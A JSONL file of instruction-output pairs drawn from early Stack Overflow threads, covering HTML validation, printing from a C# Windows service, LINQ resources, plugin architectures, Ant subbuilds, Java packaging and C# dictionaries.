{"instruction": "Even though I always strive for complete validation these days, I often wonder if it's a waste of time.  If the code runs and it looks the same in all browsers (I use browsershots.org to verify) then do I need to take it any further or am I just being overly anal?\nWhat level do you hold your code to when you create it for:\na) yourself\nb) your clients\nP.S. Jeff and company, why doesn't stack overflow validate? :)\nEDIT: Some good insights, I think that since I've been so valid-obsessed for so long I program knowing what will cause problems and what won't so I'm in a better position than people who create a site first and then \"go back and fix the validation problems\"\nI think I may post another question on stack overflow; \"Do you validate as you go or do you finish and then go back and validate?\" as that seems to be where this question is going", "output": "I think it's only \"tech\" guys that really care for \"100% standard compliance\". My usual page consumers (= users) don't care if there's no alt-attribute for a \"menu border picture element\".\nI usually just make sure that I don't see any obvious errors (all tags closed, all lower case, attributes in quotes, ...), but if it looks good on IE and FF, that's all I care for. I don't really care if I use a non-standard attribute in any HTML tag, so that the page doesn't validate against an DTD - as long as I get the visual results that I intended to get."}
{"instruction": "Even though I always strive for complete validation these days, I often wonder if it's a waste of time.  If the code runs and it looks the same in all browsers (I use browsershots.org to verify) then do I need to take it any further or am I just being overly anal?\nWhat level do you hold your code to when you create it for:\na) yourself\nb) your clients\nP.S. Jeff and company, why doesn't stack overflow validate? :)\nEDIT: Some good insights, I think that since I've been so valid-obsessed for so long I program knowing what will cause problems and what won't so I'm in a better position than people who create a site first and then \"go back and fix the validation problems\"\nI think I may post another question on stack overflow; \"Do you validate as you go or do you finish and then go back and validate?\" as that seems to be where this question is going", "output": "I know this isn't answering your whole question, but it is worth considering that by using completely valid html you can be sure that your website should work properly in future web browsers that haven't been released yet."}
{"instruction": "I am working on a project right now that involves receiving a message from another application, formatting the contents of that message, and sending it to a printer.  Technology of choice is C# windows service.  The output could be called a report, I suppose, but a reporting engine is not necessary.  A simple templating engine, like StringTemplate, or even XSLT outputting HTML would be fine.  The problem I'm having is finding a free way to print this kind of output from a service.  Since it seems that it will work, I'm working on a prototype using Microsoft's RDLC, populating a local report and then rendering it as an image to a memory stream, which I will then print.  Issues with that are:\n\nMulti-page printing will be a big headache.\nStill have to use PrintDocument to print the memory stream, which is unsupported in a Windows Service (though it may work - haven't gotten that far with the prototype yet)\nIf the data coming across changes, I have to change the dataset, and the class that the data is being deserialized into.  bad bad bad.\n\nHas anyone had to do anything remotely like this?  Any advice?  I already posed a question about printing HTML without user input, and after wasting about 3 days on that, I have come to the conclusion that it cannot be done, at least not with any freely available tool.\nAll help is appreciated.\nEDIT: We are on version 2.0 of the .NET framework.", "output": "This may not be what you're looking for, but if I needed to do this quick&dirty, I would:\n\nCreate a separate WPF application (so I could use the built-in document handling)\nGive the service the ability to interact with the desktop (note that you don't actually have to show anything on the desktop, or be logged in for this to work)\nHave the service run the application, and give it the data to print.\n\nYou could probably also jigger this to print from a web browser that you run from the service (though I'd recommend building your own shell IE, rather than using a full browser).\nFor a more detailed (also free) solution, your best bet is probably to manually format the document yourself (using GDI+ to do the layout for you). This is tedious, error prone, time consuming, and wastes a lot of paper during development, but also gives you the most control over what's going to the printer."}
{"instruction": "During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.\nWhat is LINQ and how do I get started?\nLinks guides or documentation a bonus :)\nPS: I am a long time C# developer who daily uses Datatables and Parameterized SQL", "output": "Here you go. I started with ScottGu's explanation/examples and went from there:\nhttp://weblogs.asp.net/scottgu/archive/2007/05/19/using-linq-to-sql-part-1.aspx"}
{"instruction": "During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.\nWhat is LINQ and how do I get started?\nLinks guides or documentation a bonus :)\nPS: I am a long time C# developer who daily uses Datatables and Parameterized SQL", "output": "LINQ stands for Language Integrated Query and is a set of extensions for .NET that allow you to query data the same way from code and isn't tied to a specific data source.  You can use the same LINQ code for SQL Server, XML, objects, DataSets, and Entities.\nHere is a good intro from Scott Guthrie\nThis is a nice set of 101 LINQ Samples"}
{"instruction": "During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.\nWhat is LINQ and how do I get started?\nLinks guides or documentation a bonus :)\nPS: I am a long time C# developer who daily uses Datatables and Parameterized SQL", "output": "Start with everything Scott Guthrie has on linq\nGet LINQ Pocket Reference, which is an excerpt from C# 3.0 in a Nutshell"}
{"instruction": "During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.\nWhat is LINQ and how do I get started?\nLinks guides or documentation a bonus :)\nPS: I am a long time C# developer who daily uses Datatables and Parameterized SQL", "output": "Here are a couple of good tutorials (video) from OakLeaf Systems:\nhttp://oakleafblog.blogspot.com/2007/04/two-new-linq-to-sql-video-segments-from.html\nhttp://oakleafblog.blogspot.com/2007/05/mike-taulty-posts-six-new-linq-to-xml.html\nEDIT: I just ran into this great tool created by the author of C# in a Nutshell:\nhttp://www.linqpad.net/\nIt includes lots of great easy to follow samples."}
{"instruction": "During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.\nWhat is LINQ and how do I get started?\nLinks guides or documentation a bonus :)\nPS: I am a long time C# developer who daily uses Datatables and Parameterized SQL", "output": "Two books you should consider for learning about LINQ, both from Manning:\n\nC# in Depth\nLINQ in Action\n\nThe former was by far the better written, and taught me almost as much about LINQ in a single chapter than the latter did in a whole book.  LINQ is built on a lot of foundation, and C# in Depth builds it up from the ground.\nThe second book is a whole lot better than nothing, and you will learn things specifically about LINQ that you won't learn in the first.  But the first book will give you much better foundation, and puts up at least a token perspective instead of more or less blindly following the MS line.  So, I'm recommending C# in Depth first and foremost for learning LINQ.\nMike"}
{"instruction": "During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.\nWhat is LINQ and how do I get started?\nLinks guides or documentation a bonus :)\nPS: I am a long time C# developer who daily uses Datatables and Parameterized SQL", "output": "Linq is short for \"Language integrated query.\" It's a set of language enhancements built into C# and VB. Basically, what you get is a bunch of  standard query operators that can be applied to any IEnumerable of type T. There's a lot of different linq providers for specific types of data- for example, there's linq to xml, linq to entities, even linq to sharepoint. \nTo get started with linq, in all its many forms, I suggest the book Pro Linq by Joseph C. Rattz. It's an excellent overview of Linq. He takes a ground-up approach, first describing all the language features (like Lambda Expressions and Expression Trees) that Linq is built on, and then moving on to some standard linq provider implementations.\nAdditionally, here's a pretty good MSDN article describing Linq: LINQ: .NET Language-Integrated Query\nNow, Linq to Sql is a linq provider written specifically for SQL Server. Included in this provider is an OR/M, that gives you some handy-dandy functionality (like typing out all your sql tables, so you get a robust design-time view of your database schema.) It's totally awesome, and for me, has greatly speed up development time when working with a sql database.\nThe book I recommended above also has a great section about using Linq To Sql. Also,\nhere's a good \"beginner's guide\" article from MSDN: Linq To SQL: .NET Language-Integrated Query for Relational Data"}
{"instruction": "During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.\nWhat is LINQ and how do I get started?\nLinks guides or documentation a bonus :)\nPS: I am a long time C# developer who daily uses Datatables and Parameterized SQL", "output": "I think this book:\nC# in Depth\nBy Jon Skeet is an excellent programmers' guide that matches your exact needs (moving from earlier C# to C#3.5). \nAlso if you order it you get the electronic copy too - something more publishers should do (excellent for both Kindles and searching)."}
{"instruction": "I am working on a project right now that involves receiving a message from another application, formatting the contents of that message, and sending it to a printer.  Technology of choice is C# windows service.  The output could be called a report, I suppose, but a reporting engine is not necessary.  A simple templating engine, like StringTemplate, or even XSLT outputting HTML would be fine.  The problem I'm having is finding a free way to print this kind of output from a service.  Since it seems that it will work, I'm working on a prototype using Microsoft's RDLC, populating a local report and then rendering it as an image to a memory stream, which I will then print.  Issues with that are:\n\nMulti-page printing will be a big headache.\nStill have to use PrintDocument to print the memory stream, which is unsupported in a Windows Service (though it may work - haven't gotten that far with the prototype yet)\nIf the data coming across changes, I have to change the dataset, and the class that the data is being deserialized into.  bad bad bad.\n\nHas anyone had to do anything remotely like this?  Any advice?  I already posed a question about printing HTML without user input, and after wasting about 3 days on that, I have come to the conclusion that it cannot be done, at least not with any freely available tool.\nAll help is appreciated.\nEDIT: We are on version 2.0 of the .NET framework.", "output": "Printing from a Windows service is really painful. It seems to work... sometimes... but finally it craches or throws an exception from time to time, without any clear reason. It's really hopeless. Officially, it's even not supported, without any explanation, nor any proposal for an alternate solution.\nRecently, I have been confronted to the problem and after several unsuccessful trials and experimentations, I came finally with two viable solutions:\n\nWrite your own printing DLL using the Win32 API (in C/C++ for instance), then use it from your service with P/Invoke (works fine)\nWrite your own printing COM+ component, then uses it from your service. I have chosen this solution with success recently (but it was third party COM+ component, not own written) It works absolutely fine too."}
{"instruction": "I am working on a project right now that involves receiving a message from another application, formatting the contents of that message, and sending it to a printer.  Technology of choice is C# windows service.  The output could be called a report, I suppose, but a reporting engine is not necessary.  A simple templating engine, like StringTemplate, or even XSLT outputting HTML would be fine.  The problem I'm having is finding a free way to print this kind of output from a service.  Since it seems that it will work, I'm working on a prototype using Microsoft's RDLC, populating a local report and then rendering it as an image to a memory stream, which I will then print.  Issues with that are:\n\nMulti-page printing will be a big headache.\nStill have to use PrintDocument to print the memory stream, which is unsupported in a Windows Service (though it may work - haven't gotten that far with the prototype yet)\nIf the data coming across changes, I have to change the dataset, and the class that the data is being deserialized into.  bad bad bad.\n\nHas anyone had to do anything remotely like this?  Any advice?  I already posed a question about printing HTML without user input, and after wasting about 3 days on that, I have come to the conclusion that it cannot be done, at least not with any freely available tool.\nAll help is appreciated.\nEDIT: We are on version 2.0 of the .NET framework.", "output": "Trust me, you will spend more money trying to search/develop a solution for this as compared to buying a third party component. Do not reinvent the wheel and go for the paid solution.\nPrinting is a complex problem and I would love to see the day when better framework support is added for this."}
{"instruction": "Is there a general procedure for programming extensibility capability into your code?\nI am wondering what the general procedure is for adding extension-type capability to a system you are writing so that functionality can be extended through some kind of plugin API rather than having to modify the core code of a system.\nDo such things tend to be dependent on the language the system was written in, or is there a general method for allowing for this?", "output": "Find out what minimum requrements you want to put on a plugin writer. Then make one or more Interfaces that the writer must implement for your code to know when and where to execute the code.  \nMake an API the writer can use to access some of the functionality in your code.  \n\nYou could also make a base class the writer must inherit. This will make wiring up the API easier. Then use some kind of reflection to scan a directory, and load the classes you find that matches your requirements.  \nSome people also make a scripting language for their system, or implements an interpreter for a subset of an existing language. This is also a possible route to go.\nBottom line is: When you get the code to load, only your imagination should be able to stop you.\nGood luck."}
{"instruction": "Is there a general procedure for programming extensibility capability into your code?\nI am wondering what the general procedure is for adding extension-type capability to a system you are writing so that functionality can be extended through some kind of plugin API rather than having to modify the core code of a system.\nDo such things tend to be dependent on the language the system was written in, or is there a general method for allowing for this?", "output": "This is generally something that\u00a0you'll have to expose yourself, so yes, it will be dependent on the language your system is written in (though often it's possible to write wrappers for other languages as well).\nIf, for example, you had a program written in C, for Windows, plugins would be written for your program as DLLs.  At runtime, you would manually load these DLLs, and expose some interface to them.  For example, the DLLs might expose a gimme_the_interface() function which could accept a structure filled with function pointers.  These function pointers would allow the DLL to make calls, register callbacks, etc.\nIf you were in C++, you would use the DLL system, except you would probably pass an object pointer instead of a struct, and the object would implement an interface which provided functionality (accomplishing the same thing as the struct, but less ugly).  For Java, you would load class files on-demand instead of DLLs, but the basic idea would be the same.\nIn all cases, you'll need to define a standard interface between your code and the plugins, so that you can initialize the plugins, and so the plugins can interact with you.\nP.S. If you'd like to see a good example of a C++ plugin system, check out the foobar2000 SDK.  I haven't used it in quite a while, but it used to be really well done.  I assume it still is."}
{"instruction": "Is there a general procedure for programming extensibility capability into your code?\nI am wondering what the general procedure is for adding extension-type capability to a system you are writing so that functionality can be extended through some kind of plugin API rather than having to modify the core code of a system.\nDo such things tend to be dependent on the language the system was written in, or is there a general method for allowing for this?", "output": "I've used event-based APIs for plugins in the past. You can insert hooks for plugins by dispatching events and providing access to the application state.\nFor example, if you were writing a blogging application, you might want to raise an event just before a new post is saved to the database, and provide the post HTML to the plugin to alter as needed."}
{"instruction": "Is there a general procedure for programming extensibility capability into your code?\nI am wondering what the general procedure is for adding extension-type capability to a system you are writing so that functionality can be extended through some kind of plugin API rather than having to modify the core code of a system.\nDo such things tend to be dependent on the language the system was written in, or is there a general method for allowing for this?", "output": "I'm tempted to point you to the Design Patterns book for this generic question :p\nSeriously, I think the answer is no. You can't write extensible code by default, it will be both hard to write/extend and awfully inefficient (Mozilla started with the idea of being very extensible, used XPCOM everywhere, and now they realized it was a mistake and started to remove it where it doesn't make sense).\nwhat makes sense to do is to identify the pieces of your system that can be meaningfully extended and support a proper API for these cases (e.g. language support plug-ins in an editor). You'd use the relevant patterns, but the specific implementation depends on your platform/language choice.\nIMO, it also helps to use a dynamic language - makes it possible to tweak the core code at run time (when absolutely necessary). I appreciated that Mozilla's extensibility works that way when writing Firefox extensions."}
{"instruction": "I am working on a project right now that involves receiving a message from another application, formatting the contents of that message, and sending it to a printer.  Technology of choice is C# windows service.  The output could be called a report, I suppose, but a reporting engine is not necessary.  A simple templating engine, like StringTemplate, or even XSLT outputting HTML would be fine.  The problem I'm having is finding a free way to print this kind of output from a service.  Since it seems that it will work, I'm working on a prototype using Microsoft's RDLC, populating a local report and then rendering it as an image to a memory stream, which I will then print.  Issues with that are:\n\nMulti-page printing will be a big headache.\nStill have to use PrintDocument to print the memory stream, which is unsupported in a Windows Service (though it may work - haven't gotten that far with the prototype yet)\nIf the data coming across changes, I have to change the dataset, and the class that the data is being deserialized into.  bad bad bad.\n\nHas anyone had to do anything remotely like this?  Any advice?  I already posed a question about printing HTML without user input, and after wasting about 3 days on that, I have come to the conclusion that it cannot be done, at least not with any freely available tool.\nAll help is appreciated.\nEDIT: We are on version 2.0 of the .NET framework.", "output": "I think we are going to go the third party route.  I like the XSL -> HTML -> PDF -> Printer flow... Winnovative's HTML to PDF looks good for the first part, but I'm running into a block finding a good PDF printing solution... any suggestions?  Ideally the license would be on a developer basis, not on a deployed runtime basis."}
{"instruction": "Is there a general procedure for programming extensibility capability into your code?\nI am wondering what the general procedure is for adding extension-type capability to a system you are writing so that functionality can be extended through some kind of plugin API rather than having to modify the core code of a system.\nDo such things tend to be dependent on the language the system was written in, or is there a general method for allowing for this?", "output": "If you are using a compiled language such as C or C++, it may be a good idea to look at plugin support via scripting languages.  Both Python and Lua are excellent languages that are used to script a large number of applications (Civ4 and blender use Python, Supreme Commander uses Lua, etc).  \nIf you are using C++, check out the boost python library.  Otherwise, python ships with headers that can be used in C, and does a fairly good job documenting the C/python API.  The documentation seemed less complete for Lua, but I may not have been looking hard enough.  Either way, you can offer a fairly solid scripting platform without a terrible amount of work.  It still isn't trivial, but it provides you with a very good base to work from."}
{"instruction": "I am working on a project right now that involves receiving a message from another application, formatting the contents of that message, and sending it to a printer.  Technology of choice is C# windows service.  The output could be called a report, I suppose, but a reporting engine is not necessary.  A simple templating engine, like StringTemplate, or even XSLT outputting HTML would be fine.  The problem I'm having is finding a free way to print this kind of output from a service.  Since it seems that it will work, I'm working on a prototype using Microsoft's RDLC, populating a local report and then rendering it as an image to a memory stream, which I will then print.  Issues with that are:\n\nMulti-page printing will be a big headache.\nStill have to use PrintDocument to print the memory stream, which is unsupported in a Windows Service (though it may work - haven't gotten that far with the prototype yet)\nIf the data coming across changes, I have to change the dataset, and the class that the data is being deserialized into.  bad bad bad.\n\nHas anyone had to do anything remotely like this?  Any advice?  I already posed a question about printing HTML without user input, and after wasting about 3 days on that, I have come to the conclusion that it cannot be done, at least not with any freely available tool.\nAll help is appreciated.\nEDIT: We are on version 2.0 of the .NET framework.", "output": "Printing from a service is a bad idea. Network printers are connected \"per-user\". You can mark the service to be run as a particular user, but I'd consider that a bad security practice. You might be able to connect to a local printer, but I'd still hesitate before going this route.\nThe best option is to have the service store the data and have a user-launched application do the printing by asking the service for the data. Or a common location that the data is stored, like a database. \nIf you need to have the data printed as regular intervals, setup a Task event thru the Task Scheduler. Launching a process from a service will require knowing the user name and password, which again is bad security practice.\nAs for the printing itself, use a third-party tool to generate the report will be the easiest."}
{"instruction": "I'm having trouble figuring out how to get the testing framework set up and usable in Visual Studio 2008 for C++ presumably with the built-in unit testing suite.\nAny links or tutorials would be appreciated.", "output": "I've used CppUnit with VS2005 and Eclipse. The wiki is very thorough (especially if you are familiar with JUnit)."}
{"instruction": "I'm having trouble figuring out how to get the testing framework set up and usable in Visual Studio 2008 for C++ presumably with the built-in unit testing suite.\nAny links or tutorials would be appreciated.", "output": "I'm not 100% sure about VS2008, but I know that the Unit Testing framework that microsoft shipped in VS2005 as part of their Team Suite was only for .NET, not C++\nI've used CppUnit also and it was alright. Much the same as NUnit/JUnit/so on.\nIf you've used boost, they also have a unit testing library\nThe guys behind boost have some serious coding chops, so I'd say their framework should be pretty good, but it might not be the most user friendly :-)"}
{"instruction": "I'm suddenly back to WinForms, after years of web development, and am having trouble  with something that should be simple.  I have an ArrayList of business objects bound to a  Windows Forms DataGrid.  I'd like the user to be able to edit the cells, and when finished,  press a Save button.  At that point I'd like to iterate the all the rows and columns in the  DataGrid to find any changes, and save them to the database.  But I can't find a way to  access the DataGrid rows.  \nI'll also want to validate individual cells real time, as they are edited, but I'm pretty  sure that can be done.  (Maybe not with an ArrayList as the DataSource?)  But as for iterating the DataGrid, I'm quite surprised it doesn't seem possible.\nMust I really stuff my business objects data into datatables in order to use the datagrid?", "output": "Aha, I was really just testing everyone once again!  :)  The real answer is, you rarely need to iterate the datagrid.  Because even when binding to an ArrayList, the binding is 2 way.  Still, it is handy to know how to itereate the grid directly, it can save a few lines of code now and then.  \nBut NotMyself and Orion gave the better answers:  Convince the stakeholders to move up to a higher version of C#, to save development costs and increase maintainability and extensability."}
{"instruction": "I am writing an application in Java for the desktop using the Eclipse SWT library for GUI rendering.  I think SWT helps Java get over the biggest hurdle for acceptance on the desktop: namely providing a Java application with a consistent, responsive interface that looks like that belonging to any other app on your desktop.  However, I feel that packaging an application is still an issue.  \nOS X natively provides an easy mechanism for wrapping Java apps in native application bundles, but producing an app for Windows/Linux that doesn't require the user to run an ugly batch file or click on a .jar is still a hassle.  Possibly that's not such an issue on Linux, where the user is likely to be a little more tech-savvy, but on Windows I'd like to have a regular .exe for him/her to run.\nHas anyone had any experience with any of the .exe generation tools for Java that are out there?  I've tried JSmooth but had various issues with it.  Is there a better solution before I crack out Visual Studio and roll my own?\nEdit:  I should perhaps mention that I am unable to spend a lot of money on a commercial solution.", "output": "Maybe you should take a look at IzPack. I created a very nice installer some years ago and I'd bet that they are still improving it. It allows the installation of docs, binaries and a clickable link to start the application IIRC."}
{"instruction": "I am writing an application in Java for the desktop using the Eclipse SWT library for GUI rendering.  I think SWT helps Java get over the biggest hurdle for acceptance on the desktop: namely providing a Java application with a consistent, responsive interface that looks like that belonging to any other app on your desktop.  However, I feel that packaging an application is still an issue.  \nOS X natively provides an easy mechanism for wrapping Java apps in native application bundles, but producing an app for Windows/Linux that doesn't require the user to run an ugly batch file or click on a .jar is still a hassle.  Possibly that's not such an issue on Linux, where the user is likely to be a little more tech-savvy, but on Windows I'd like to have a regular .exe for him/her to run.\nHas anyone had any experience with any of the .exe generation tools for Java that are out there?  I've tried JSmooth but had various issues with it.  Is there a better solution before I crack out Visual Studio and roll my own?\nEdit:  I should perhaps mention that I am unable to spend a lot of money on a commercial solution.", "output": "Have you considered writing a small program in C/C++ that just calls CreateProcess to start up the java VM with the jar (or class) file?\nYou could get Visual C++ Express and put together the startup program pretty easily.  This would make it easy to add a friendly icon as well."}
{"instruction": "I am writing an application in Java for the desktop using the Eclipse SWT library for GUI rendering.  I think SWT helps Java get over the biggest hurdle for acceptance on the desktop: namely providing a Java application with a consistent, responsive interface that looks like that belonging to any other app on your desktop.  However, I feel that packaging an application is still an issue.  \nOS X natively provides an easy mechanism for wrapping Java apps in native application bundles, but producing an app for Windows/Linux that doesn't require the user to run an ugly batch file or click on a .jar is still a hassle.  Possibly that's not such an issue on Linux, where the user is likely to be a little more tech-savvy, but on Windows I'd like to have a regular .exe for him/her to run.\nHas anyone had any experience with any of the .exe generation tools for Java that are out there?  I've tried JSmooth but had various issues with it.  Is there a better solution before I crack out Visual Studio and roll my own?\nEdit:  I should perhaps mention that I am unable to spend a lot of money on a commercial solution.", "output": "Another option I was considering: rather than writing a native launcher from scratch, Eclipse comes with the source code for its own launcher, and this could perhaps be repurposed for my app.\nIt's a shame that Sun never included anything similar in the JDK."}
{"instruction": "I have a build script and as part of that script it copies a jar file to a directory, for ease lets call it the utils jar.  the utils jar is built by another build script sitting in another directory.  What im trying to do have my build script run the utils build script so that I can ensure the utils jar is up to date.\nSo I know I need to import the utils build file.\n<import file=\"../utils/build/build.xml\" />\n\nWhich doesn't work because the import task, unlike almost every other ant taks, doesn't run from basedir, it runs from the pwd.  So to get around that I have this little ditty, which does successfully import the build file\n  <property name=\"baseDirUpOne\" location=\"..\" />\n  <import file=\"${baseDirUpOne}/utils/build/build.xml\" />\n\nSo now that ive solved my import problem I need to call the task, well that should be easy right:\n<antcall target=\"utils.package\" />\n\nnote that in the above, utils is the project name of ../utils/build/build.xml\nthe problem I'm now running into is that ant call doesn't execute in ../utils/build so what I need, and cant find, is a runat property or something similar, essentially:\n<antcall target=\"utils.package\" runat=\"../utils/build\" />\n\nThe reason I need this is that in my utils build file the step to select which code to copy to the jar is based on relative paths so as to avoid hardcoding paths in my ant file. Any ideas?", "output": "I've got something similar set up: I have a main Ant build.xml which calls a separate build.xml that takes care of building my tests. This is how I do it:\n<target name=\"build-tests\">\n    <subant target=\"build\">\n      <fileset dir=\"${test.home}\" includes=\"build.xml\"/>\n    </subant>\n</target>\n\nThe trick is to use subant instead of antcall. You don't have to import the other build file."}
{"instruction": "I have a build script and as part of that script it copies a jar file to a directory, for ease lets call it the utils jar.  the utils jar is built by another build script sitting in another directory.  What im trying to do have my build script run the utils build script so that I can ensure the utils jar is up to date.\nSo I know I need to import the utils build file.\n<import file=\"../utils/build/build.xml\" />\n\nWhich doesn't work because the import task, unlike almost every other ant taks, doesn't run from basedir, it runs from the pwd.  So to get around that I have this little ditty, which does successfully import the build file\n  <property name=\"baseDirUpOne\" location=\"..\" />\n  <import file=\"${baseDirUpOne}/utils/build/build.xml\" />\n\nSo now that ive solved my import problem I need to call the task, well that should be easy right:\n<antcall target=\"utils.package\" />\n\nnote that in the above, utils is the project name of ../utils/build/build.xml\nthe problem I'm now running into is that ant call doesn't execute in ../utils/build so what I need, and cant find, is a runat property or something similar, essentially:\n<antcall target=\"utils.package\" runat=\"../utils/build\" />\n\nThe reason I need this is that in my utils build file the step to select which code to copy to the jar is based on relative paths so as to avoid hardcoding paths in my ant file. Any ideas?", "output": "Try using the \"ant\" task instead of the \"antcall\" task, which runs the imported build directly instead of importing it into the current build file. It has a \"dir\" parameter:\n\nthe directory to use as a basedir\n  for the new Ant project. Defaults to\n  the current project's basedir, unless\n  inheritall has been set to false, in\n  which case it doesn't have a default\n  value. This will override the basedir\n  setting of the called project.\n\nSo you could do:\n<ant antfile=\"${baseDirUpOne}/utils/build/build.xml\" dir=\"../utils/build\" />\n\nor something like that."}
{"instruction": "So I've been poking around with C# a bit lately, and all the Generic Collections have me a little confused. Say I wanted to represent a data structure where the head of a tree was a key value pair, and then there is one optional list of key value pairs below that (but no more levels than these). Would this be suitable?\npublic class TokenTree\n{\n    public TokenTree()\n    {\n        /* I must admit to not fully understanding this,\n         * I got it from msdn. As far as I can tell, IDictionary is an\n         * interface, and Dictionary is the default implementation of\n         * that interface, right?\n         */\n        SubPairs = new Dictionary<string, string>();\n    }\n\n    public string Key;\n    public string Value;\n    public IDictionary<string, string> SubPairs;\n}\n\nIt's only really a simple shunt for passing around data.", "output": "There is an actual Data Type called KeyValuePair, use like this\nKeyValuePair<string, string> myKeyValuePair = new KeyValuePair<string,string>(\"defaultkey\", \"defaultvalue\");"}
{"instruction": "So I've been poking around with C# a bit lately, and all the Generic Collections have me a little confused. Say I wanted to represent a data structure where the head of a tree was a key value pair, and then there is one optional list of key value pairs below that (but no more levels than these). Would this be suitable?\npublic class TokenTree\n{\n    public TokenTree()\n    {\n        /* I must admit to not fully understanding this,\n         * I got it from msdn. As far as I can tell, IDictionary is an\n         * interface, and Dictionary is the default implementation of\n         * that interface, right?\n         */\n        SubPairs = new Dictionary<string, string>();\n    }\n\n    public string Key;\n    public string Value;\n    public IDictionary<string, string> SubPairs;\n}\n\nIt's only really a simple shunt for passing around data.", "output": "Dictionary Class is exactly what you want, correct.\nYou can declare the field directly as Dictionary, instead of IDictionary, but that's up to you."}
{"instruction": "So I've been poking around with C# a bit lately, and all the Generic Collections have me a little confused. Say I wanted to represent a data structure where the head of a tree was a key value pair, and then there is one optional list of key value pairs below that (but no more levels than these). Would this be suitable?\npublic class TokenTree\n{\n    public TokenTree()\n    {\n        /* I must admit to not fully understanding this,\n         * I got it from msdn. As far as I can tell, IDictionary is an\n         * interface, and Dictionary is the default implementation of\n         * that interface, right?\n         */\n        SubPairs = new Dictionary<string, string>();\n    }\n\n    public string Key;\n    public string Value;\n    public IDictionary<string, string> SubPairs;\n}\n\nIt's only really a simple shunt for passing around data.", "output": "There is a KeyValuePair built-in type. As a matter of fact, this is what the IDictionary is giving you access to when you iterate in it.\nAlso, this structure is hardly a tree, finding a more representative name might be a good exercise."}
{"instruction": "So I've been poking around with C# a bit lately, and all the Generic Collections have me a little confused. Say I wanted to represent a data structure where the head of a tree was a key value pair, and then there is one optional list of key value pairs below that (but no more levels than these). Would this be suitable?\npublic class TokenTree\n{\n    public TokenTree()\n    {\n        /* I must admit to not fully understanding this,\n         * I got it from msdn. As far as I can tell, IDictionary is an\n         * interface, and Dictionary is the default implementation of\n         * that interface, right?\n         */\n        SubPairs = new Dictionary<string, string>();\n    }\n\n    public string Key;\n    public string Value;\n    public IDictionary<string, string> SubPairs;\n}\n\nIt's only really a simple shunt for passing around data.", "output": "One possible thing you could do is use the Dictionary object straight out of the box and then just extend it with your own modifications:\npublic class TokenTree : Dictionary<string, string>\n{\n    public IDictionary<string, string> SubPairs;\n}\n\nThis gives you the advantage of not having to enforce the rules of IDictionary for your Key (e.g., key uniqueness, etc).\nAnd yup you got the concept of the constructor right :)"}
{"instruction": "So I've been poking around with C# a bit lately, and all the Generic Collections have me a little confused. Say I wanted to represent a data structure where the head of a tree was a key value pair, and then there is one optional list of key value pairs below that (but no more levels than these). Would this be suitable?\npublic class TokenTree\n{\n    public TokenTree()\n    {\n        /* I must admit to not fully understanding this,\n         * I got it from msdn. As far as I can tell, IDictionary is an\n         * interface, and Dictionary is the default implementation of\n         * that interface, right?\n         */\n        SubPairs = new Dictionary<string, string>();\n    }\n\n    public string Key;\n    public string Value;\n    public IDictionary<string, string> SubPairs;\n}\n\nIt's only really a simple shunt for passing around data.", "output": "@Jay Mooney: A generic Dictionary class in .NET is actually a hash table, just with fixed types.\nThe code you've shown shouldn't convince anyone to use Hashtable instead of Dictionary, since both code pieces can be used for both types.\nFor hashtable:\nforeach(object key in h.keys)\n{\n     string keyAsString = key.ToString(); // btw, this is unnecessary\n     string valAsString = h[key].ToString();\n\n     System.Diagnostics.Debug.WriteLine(keyAsString + \" \" + valAsString);\n}\n\nFor dictionary:\nforeach(string key in d.keys)\n{\n     string valAsString = d[key].ToString();\n\n     System.Diagnostics.Debug.WriteLine(key + \" \" + valAsString);\n}\n\nAnd just the same for the other one with KeyValuePair, just use the non-generic version for Hashtable, and the generic version for Dictionary.\nSo it's just as easy both ways, but Hashtable uses Object for both key and value, which means you will box all value types, and you don't have type safety, and Dictionary uses generic types and is thus better."}
{"instruction": "So I've been poking around with C# a bit lately, and all the Generic Collections have me a little confused. Say I wanted to represent a data structure where the head of a tree was a key value pair, and then there is one optional list of key value pairs below that (but no more levels than these). Would this be suitable?\npublic class TokenTree\n{\n    public TokenTree()\n    {\n        /* I must admit to not fully understanding this,\n         * I got it from msdn. As far as I can tell, IDictionary is an\n         * interface, and Dictionary is the default implementation of\n         * that interface, right?\n         */\n        SubPairs = new Dictionary<string, string>();\n    }\n\n    public string Key;\n    public string Value;\n    public IDictionary<string, string> SubPairs;\n}\n\nIt's only really a simple shunt for passing around data.", "output": "Use something like this:  \nclass Tree < T > : Dictionary < T, IList< Tree < T > > >  \n{  \n}\n\nIt's ugly, but I think it will give you what you want. Too bad KeyValuePair is sealed."}
{"instruction": "So I've been poking around with C# a bit lately, and all the Generic Collections have me a little confused. Say I wanted to represent a data structure where the head of a tree was a key value pair, and then there is one optional list of key value pairs below that (but no more levels than these). Would this be suitable?\npublic class TokenTree\n{\n    public TokenTree()\n    {\n        /* I must admit to not fully understanding this,\n         * I got it from msdn. As far as I can tell, IDictionary is an\n         * interface, and Dictionary is the default implementation of\n         * that interface, right?\n         */\n        SubPairs = new Dictionary<string, string>();\n    }\n\n    public string Key;\n    public string Value;\n    public IDictionary<string, string> SubPairs;\n}\n\nIt's only really a simple shunt for passing around data.", "output": "Just one thing to add to this (although I do think you have already had your question answered by others). In the interests of extensibility (since we all know it will happen at some point) you may want to check out the Composite Pattern This is ideal for working with \"Tree-Like Structures\"..\nLike I said, I know you are only expecting one sub-level, but this could really be useful for you if you later need to extend ^_^"}
